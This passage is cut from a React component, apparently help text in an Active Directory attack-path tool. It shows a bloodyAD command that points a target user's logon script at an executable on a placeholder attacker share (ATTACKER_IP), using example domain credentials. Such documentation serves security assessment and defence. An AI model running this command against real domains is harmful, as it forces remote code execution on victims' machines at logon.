    ...
    return (
        <>
            <Typography variant='body2'>
                The logon script of a user can be changed using{' '}
            ...
            <Typography component={'pre'}>
                {
                    'bloodyAD --host "DC01.TESTLAB.LOCAL" -d "TESTLAB" -u "dfm.a" -p "Password123!" set object "TARGET_USER" scriptPath -v \'\\\\ATTACKER_IP\\share\\run_at_logon.exe\''
                }
            </Typography>
